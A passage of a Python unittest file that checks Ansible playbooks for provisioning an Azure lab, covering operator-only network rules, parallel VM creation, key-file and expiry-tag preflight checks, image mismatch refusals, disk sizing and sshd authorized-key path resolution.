                                                            azure_controller=controller)))
                by_name = {rule["name"]: rule for rule in rules}
                self.assertEqual(by_name["ssh-from-operator"]["source_address_prefix"], operator)
                if not https_cidr:
                    self.assertEqual(sorted(by_name), ["deny-other-inbound", "ssh-from-operator"])
                    continue
                https = by_name["https-from-operator"]
                self.assertEqual((https["source_address_prefix"], https["destination_port_range"], https["access"]),
                                 (own, 443, "Allow"))
                self.assertLess(https["priority"], by_name["deny-other-inbound"]["priority"])

    def test_the_vm_loops_start_together_and_wait_before_the_next_step(self):
        for playbook, launch_prefix, next_prefix in (("targets.yml", "Target VMs", None),
                                                     ("power.yml", "Deallocate or start", "Read the power state"),
                                                     ("remove.yml", "Remove each VM", "Remove the lab's network")):
            with self.subTest(playbook=playbook):
                tasks = self.tasks(playbook)
                start = next(index for index, task in enumerate(tasks) if task["name"].startswith(launch_prefix))
                launch, wait, cleanup = tasks[start:start + 3]
                self.assertEqual((launch["async"], launch["poll"], launch["changed_when"]), (1800, 0, False))
                results = "{{ " + launch["register"] + ".results }}"
                self.assertEqual((wait["loop"], wait["ansible.builtin.async_status"]["jid"]),
                                 (results, "{{ item.ansible_job_id }}"))
                self.assertEqual(wait["until"], wait["register"] + ".finished")
                self.assertEqual((cleanup["loop"], cleanup["ansible.builtin.async_status"]["mode"]),
                                 (results, "cleanup"))
                if next_prefix:
                    self.assertTrue(tasks[start + 3]["name"].startswith(next_prefix))

    @unittest.skipUnless(shutil.which("ansible-playbook"), "needs ansible-playbook, as CI installs it")
    def test_the_preflight_stops_on_a_missing_or_wrong_key_file_and_accepts_a_date(self):
        preflight = self.tasks("tasks-preflight.yml")
        with tempfile.TemporaryDirectory() as directory:
            work = Path(directory)
            (work / "lab.pub").write_text(self.PUBLIC_KEY + "\n")
            (work / "two.pub").write_text(self.PUBLIC_KEY + "\n" + self.PUBLIC_KEY + "\n")
            (work / "lab").write_text("-----BEGIN OPENSSH " + "PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjE\n"
                                      "-----END OPENSSH " + "PRIVATE KEY-----\n")
            base = {"azure_required_vars": ["azure_tags"],
                    "azure_required_key_files": ["azure_admin_public_key_file", "azure_automation_public_key_file"],
                    "azure_admin_public_key_file": str(work / "lab.pub"),
                    "azure_automation_public_key_file": str(work / "lab.pub"),
                    "azure_tags": {"owner": "lab", "expires": yaml.safe_load("2026-10-31")}}
            cases = {"date": base,
                     "missing": base | {"azure_admin_public_key_file": str(work / "absent.pub")},
                     "private": base | {"azure_automation_public_key_file": str(work / "lab")},
                     "two_keys": base | {"azure_admin_public_key_file": str(work / "two.pub")},
                     "empty_expiry": base | {"azure_tags": {"owner": "lab", "expires": ""}},
                     "no_key_files": base | {"azure_required_key_files": [],
                                             "azure_admin_public_key_file": str(work / "absent.pub")}}
            found = self.failed_tasks(work, {name: (preflight, variables) for name, variables in cases.items()})
            absent = str(work / "absent.pub")
        self.assertEqual(self.failed_task_names(found), {"missing": self.KEY_FILE_TASK, "private": self.KEY_FILE_TASK,
                                                         "two_keys": self.KEY_FILE_TASK, "empty_expiry": self.TAG_TASK})
        # Only the bad file fails, and its message names the variable and the file.
        (message,) = found["missing"][1]
        self.assertIn("azure_admin_public_key_file must name a public key file", message)
        self.assertIn(absent, message)

    @unittest.skipUnless(shutil.which("ansible-playbook"), "needs ansible-playbook, as CI installs it")
    def test_https_from_everyone_or_from_a_list_is_refused(self):
        guard = [t for t in self.tasks("controller.yml") if t["name"] == "Keep HTTPS to one address prefix of your own"]
        self.assertEqual(len(guard), 1)
        own, everyone = ".".join(["203", "0", "113", "0"]) + "/24", ".".join(["0"] * 4) + "/0"
        cases = {"unset": {}, "empty": {"https_cidr": None}, "own": {"https_cidr": own},
                 "star": {"https_cidr": "*"}, "internet": {"https_cidr": "Internet"},
                 "all_ipv4": {"https_cidr": everyone}, "all_ipv6": {"https_cidr": "::/0"},
                 "list": {"https_cidr": [own, everyone]}}
        with tempfile.TemporaryDirectory() as directory:
            found = self.failed_tasks(Path(directory), {name: (guard, {"azure_controller": controller})
                                                         for name, controller in cases.items()})
        self.assertEqual(self.failed_task_names(found),
                         {name: guard[0]["name"] for name in ("star", "internet", "all_ipv4", "all_ipv6", "list")})

    @unittest.skipUnless(shutil.which("ansible-playbook"), "needs ansible-playbook, as CI installs it")
    def test_an_existing_vm_with_another_marketplace_image_is_refused(self):
        listing, check = self.tasks("tasks-existing-vms.yml")
        # The listing reads Azure; the check gets a fixed list here instead.
        self.assertIn("azure.azcollection.azure_rm_virtualmachine_info", listing)
        pro = {"publisher": "Canonical", "offer": "ubuntu-24_04-lts", "sku": "ubuntu-pro", "version": "latest"}
        rocky = {"publisher": "resf", "offer": "rockylinux-x86_64", "sku": "9-base", "version": "latest"}
        gallery = {"community_gallery_image_id": "/CommunityGalleries/example/Images/Rocky-9-x86_64/Versions/latest"}
        planned = [{"name": "lab-ubuntu", "image": pro}, {"name": "lab-rocky", "image": rocky},
                   {"name": "lab-gallery", "image": gallery}]
        existing = {"none": [],
                    # Azure may spell the publisher in another case, and reports the version it resolved.
                    # A VM made from a disk has no image, and a planned gallery image is not compared.
                    "same_image": [{"name": "lab-ubuntu", "image": pro | {"publisher": "canonical",
                                                                          "version": "24.04.202610010"}},
                                   {"name": "lab-rocky"}, {"name": "lab-gallery", "image": rocky}],
                    "plain_server": [{"name": "lab-ubuntu", "image": pro | {"sku": "server"}}],
                    "from_gallery": [{"name": "lab-ubuntu", "image": gallery}],
                    "unmanaged": [{"name": "lab-other", "image": pro | {"sku": "server"}}]}
        with tempfile.TemporaryDirectory() as directory:
            found = self.failed_tasks(Path(directory), {
                name: ([check], {"azure_resource_group": "rg-lab", "azure_planned_vms": planned,
                                 "azure_existing_vms": {"vms": vms}})
                for name, vms in existing.items()})
        self.assertEqual(self.failed_task_names(found), {"plain_server": check["name"], "from_gallery": check["name"]})
        # The message names both images and how to start again from the new one.
        (message,) = found["plain_server"][1]
        for part in ("lab-ubuntu was created from Canonical:ubuntu-24_04-lts:server,",
                     "so Canonical:ubuntu-24_04-lts:ubuntu-pro would not be used.",
                     "az vm delete -g rg-lab -n lab-ubuntu --yes"):
            self.assertIn(part, message)
        self.assertIn("lab-ubuntu was created from a gallery or custom image,", found["from_gallery"][1][0])

    @unittest.skipUnless(shutil.which("ansible-playbook"), "needs ansible-playbook, as CI installs it")
    def test_target_vms_are_created_together_a_failure_shows_its_reason_and_a_rerun_changes_nothing(self):
        tasks = self.tasks("targets.yml")
        start = next(index for index, task in enumerate(tasks) if task["name"].startswith("Target VMs"))
        launch, wait, cleanup = (dict(task) for task in tasks[start:start + 3])
        launch.pop("azure.azcollection.azure_rm_virtualmachine")
        launch["stand_in_vm"] = {"name": "{{ item.name }}", "state_dir": "{{ state_dir }}",
                                 "fail": "{{ item.fail | default(false) }}"}
        wait["delay"] = 1
        with tempfile.TemporaryDirectory() as directory:
            work = Path(directory)
            for folder in ("library", "state"):
                (work / folder).mkdir()
            (work / "library" / "stand_in_vm.py").write_text(self.STAND_IN_VM)
            runs = []
            for run, failing in enumerate(("lab-rocky", None, None)):
                targets = [{"name": name, "fail": name == failing} for name in ("lab-ubuntu", "lab-alma", "lab-rocky")]
                jobs = work / f"jobs-{run}"
                result = self.run_playbook(work, [{
                    "hosts": "localhost", "gather_facts": False, "tasks": [launch, wait, cleanup],
                    "vars": {"ansible_python_interpreter": "{{ ansible_playbook_python }}",
                             "azure_targets": targets, "state_dir": str(work / "state")}}],
                    ANSIBLE_LIBRARY=str(work / "library"), ANSIBLE_ASYNC_DIR=str(jobs))
                recap = dict(part.split("=") for part in result.stdout.split("PLAY RECAP")[-1].split() if "=" in part)
                runs.append((result.returncode, recap.get("changed"), recap.get("failed"),
                             failing is None and any(jobs.iterdir())))
                if failing:
                    self.assertIn("Error creating or updating virtual machine lab-rocky - (QuotaExceeded)",
                                  result.stdout)
                    for label in ("(item=lab-ubuntu)", "(item=lab-alma)", "(item=lab-rocky)"):
                        self.assertIn(label, result.stdout)
                    times = [[float(value) for value in (work / "state" / name).read_text().split()]
                             for name in ("lab-ubuntu", "lab-alma")]
                    # Both ran at once: each started before the other ended.
                    self.assertLess(max(began for began, _ended in times), min(ended for _began, ended in times))
        # The failed run stops the play; the others create the last VM, then change nothing,
        # and remove their job results.
        self.assertEqual(runs, [(2, "0", "1", False), (0, "1", "0", False), (0, "0", "0", False)])

    def test_targets_get_the_image_size_on_red_hat_images_and_keep_40_gb_otherwise(self):
        expression = self.disk_expression("targets.yml", "Target VMs")
        for publisher, size in (("RedHat", 64), ("redhat", 64), ("Canonical", 40), ("almalinux", 40)):
            with self.subTest(publisher=publisher):
                self.assertEqual(self.render(expression, item={"image": {"publisher": publisher}}), size)
        self.assertEqual(self.render(expression, item={"image": {"publisher": "RedHat"}, "os_disk_size_gb": 128}), 128)
        # A gallery or custom image is given by ID and has no publisher.
        gallery = {"community_gallery_image_id": "/CommunityGalleries/example/Images/Rocky-9-x86_64/Versions/latest"}
        self.assertEqual(self.render(expression, item={"image": gallery}), 40)

    def test_the_controller_gets_the_image_size_on_red_hat_images_and_keeps_32_gb_otherwise(self):
        expression = self.disk_expression("controller.yml", "Controller VM")
        for publisher, size in (("RedHat", 64), ("Canonical", 32), ("almalinux", 32)):
            with self.subTest(publisher=publisher):
                self.assertEqual(self.render(expression, azure_controller={"image": {"publisher": publisher}}), size)
        self.assertEqual(self.render(expression, azure_controller={"image": {"publisher": "Canonical"},
                                                                   "os_disk_size_gb": 48}), 48)
        self.assertEqual(self.render(expression, azure_controller={"image": {"id": "/subscriptions/x/images/y"}}), 32)

    def test_a_marketplace_plan_is_passed_through_only_when_given(self):
        for playbook, task_prefix, owner in (("targets.yml", "Target VMs", "item"),
                                             ("controller.yml", "Controller VM", "azure_controller")):
            with self.subTest(playbook=playbook):
                tasks = yaml.safe_load((ROOT / "platforms" / "azure" / playbook).read_text())[0]["tasks"]
                task = next(t for t in tasks if t["name"].startswith(task_prefix))
                self.assertEqual(task["azure.azcollection.azure_rm_virtualmachine"]["plan"],
                                 "{{ " + owner + ".plan | default(omit) }}")


@unittest.skipUnless(shutil.which("ansible-playbook"), "needs ansible-playbook, as CI installs it")
class BootstrapKeyPathTests(unittest.TestCase):
    """bootstrap-existing-vm.yml must read sshd's AuthorizedKeysFile the way Ansible renders it.

    Plain Jinja and ansible-core treat backslash escapes in this expression differently, so
    the expression runs through ansible-playbook itself. CI runs these tests before it
    installs any collection, so they use ansible-core alone, with an empty collections path:
    each case writes its result to a file, because the JSON stdout callback is in ansible.posix.
    """

    HOME = "/home/svc_ansible"
    CASES = [
        (HOME, ["authorizedkeysfile .ssh/authorized_keys"], ["/home/svc_ansible/.ssh/authorized_keys"]),
        (HOME, ["authorizedkeysfile .ssh/authorized_keys .ssh/authorized_keys2"],
         ["/home/svc_ansible/.ssh/authorized_keys", "/home/svc_ansible/.ssh/authorized_keys2"]),
        (HOME, ["authorizedkeysfile %h/.ssh/authorized_keys"], ["/home/svc_ansible/.ssh/authorized_keys"]),
        (HOME, ["authorizedkeysfile /home/%u/.ssh/authorized_keys"], ["/home/svc_ansible/.ssh/authorized_keys"]),
        (HOME, ["authorizedkeysfile /etc/ssh/keys/%u /etc/ssh/keys/%U"],
         ["/etc/ssh/keys/svc_ansible", "/etc/ssh/keys/1001"]),
        # The account's real home from getent, which need not be under /home.
        ("/var/lib/svc_ansible", ["authorizedkeysfile .ssh/authorized_keys %h/.ssh/authorized_keys2"],
         ["/var/lib/svc_ansible/.ssh/authorized_keys", "/var/lib/svc_ansible/.ssh/authorized_keys2"]),
        # No AuthorizedKeysFile line reads as "none", which is not the account's file, so the
        # playbook's check refuses the policy.
        (HOME, ["port 22"], ["/home/svc_ansible/none"]),
    ]

    def test_relative_token_and_absolute_paths_resolve(self):
        play = yaml.safe_load((ROOT / "onboard" / "existing" / "bootstrap-existing-vm.yml").read_text())[0]
        expression = None
        for task in play["tasks"]:
            for inner in task.get("block", []):
                if "bootstrap_key_paths" in inner.get("vars", {}):
                    expression = inner["vars"]["bootstrap_key_paths"]
        self.assertIsNotNone(expression, "bootstrap_key_paths not found")
        with tempfile.TemporaryDirectory() as work:
            tasks = [{"name": f"case {index}",
                      "ansible.builtin.copy": {"content": "{{ bootstrap_key_paths | to_json }}",
                                               "dest": f"{work}/case{index}.json", "mode": "0600"},
                      "vars": {"bootstrap_sshd_policy": {"stdout_lines": lines}, "bootstrap_home": home,
                               "bootstrap_uid": "1001", "bootstrap_key_paths": expression}}
                     for index, (home, lines, _expected) in enumerate(self.CASES)]
            playbook = Path(work) / "paths.yml"
            playbook.write_text(yaml.safe_dump([{
                "hosts": "localhost", "gather_facts": False, "tasks": tasks,
                "vars": {"ansible_python_interpreter": "{{ ansible_playbook_python }}"}}]))
            config = Path(work) / "ansible.cfg"
            config.write_text("[defaults]\n")
            collections = Path(work) / "collections"
            collections.mkdir()
            environment = dict(os.environ, ANSIBLE_LOCALHOST_WARNING="False",
                               ANSIBLE_INVENTORY_UNPARSED_WARNING="False", ANSIBLE_CONFIG=str(config),
                               ANSIBLE_COLLECTIONS_PATH=str(collections), ANSIBLE_COLLECTIONS_SCAN_SYS_PATH="False")
            result = subprocess.run(["ansible-playbook", "-i", "localhost,", "-c", "local", str(playbook)],
                                    capture_output=True, text=True, timeout=120, cwd=work, env=environment)
            self.assertEqual(result.returncode, 0, result.stdout[-2000:] + result.stderr[-2000:])
            rendered = [json.loads((Path(work) / f"case{index}.json").read_text())
                        for index in range(len(self.CASES))]
        self.assertEqual(rendered, [expected for _home, _lines, expected in self.CASES])


if __name__ == "__main__":
    unittest.main()
